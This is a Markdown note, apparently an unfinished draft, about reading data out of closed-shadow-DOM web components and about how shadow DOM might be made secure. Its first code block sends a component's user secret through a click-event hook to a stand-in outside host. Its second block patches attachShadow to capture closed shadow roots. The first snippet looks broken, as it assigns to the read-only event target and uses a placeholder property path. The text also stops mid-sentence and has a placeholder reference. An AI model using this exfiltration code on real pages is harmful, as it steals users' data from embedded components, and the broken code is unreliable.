# HowTo: hack the shadowDOM?

Security: events as leaks for closed shadowDOMs

Let's say you know about a reusable web component with a `closed` shadowDOM. This web component contains some user data that you wish to read. And it listens for a `composed: true` event, such as `click`? Can you access this data somehow if you can get a script running in the same application?

Yes. By listening for the `click` event and then altering the properties of that event.

```javascript
window.addEventListener("click", function(e){
  e.target = function(e){
    const deepTarget = Event.prototype.target.call(e);
    const secret = deepTarget.property.discoveredInDevtools.withMyOwnUser;
    fetch("https://iam.sheep.com/?littleRed=" + secret.user + "&grandma=" + secret.data);
    return deepTarget;
  }
}, true);
```

Another way to access another man's closed shadowDOM is manipulating the `HTMLElement` prototype:
```javascript
const og = HTMLElement.prototype.attachShadow;
Object.defineProperty(HTMLElement.prototype, "attachShadow", {
  value: function(options){
    const shadow = og.call(this, options);
    if (options === undefined || options.mode === "closed")
      this.__closedShadowRoot = shadow;
    return shadow;
  }
});
```

A third way to intercept a `closed` shadowDOMs of a third party is to manipulate the `customElements.define(...)` method.

A forth way to intercept a `closed` shadowDOMs of a third party is to fetch it like text, alter the text directly `replace('{mode: "closed"}', '{mode: "open"}')` and then attach it as an inline script and then load it.

So, shadowDOMs are insecure. They are *not* `<iframe>`s. Yet. But, who is to say they may not be in the future. That there will be the need for and implementation of a set of `.attachShadow({mode: "secure"})` some time in the not so distant future?

On the road towards a more secure shadowDOM, the security loopholes are:
1. In the same way as `<iframe>`s are loaded in secure containers, scripts containing web components must be loaded as isolated entities in the DOM. The browsers must extend their CORS to also, somehow, include web component definition scripts.
2. The interaction between the isolated web components and the rest of the application must be pure data top-down. The `<slot>` system and the CSS borders provide a fairly good basis for achieving this in HTML and CSS, and if the events are not the same object, and originate at the lowest level before propagating up, ie. bounce, then this is achieved on the JS side as well.


## Discussion

`closed` shadowDOMs should secure the inner elements of the web component from being tampered with by the outside context. This should also hold true for `open` shadowDOMs. `closed` just makes it "impossible" to do so.

The "impossibility" of accessing `closed` shadowDOM elements content can make them a) a source for security for developers and thus b) a target for hackers. Imagine that you are developing a web component for communicating user data to a server. You want this web component to be used by many other different sites, so that your user can load his data into it, making it visible to him/her, but at the same time making the data inaccessible for the third party app. web components 
`composed: true` events thus provide a security hole from the shadowDOM down into the web component in a running app. Now, it should be said that if you can access a lightDOM script above a web component, then this event property hack is not you biggest concern. However, it is one of many openings. And a needless one at that. If   
   
## References

 * [dont use shadowDOM for security](find some articles about this)
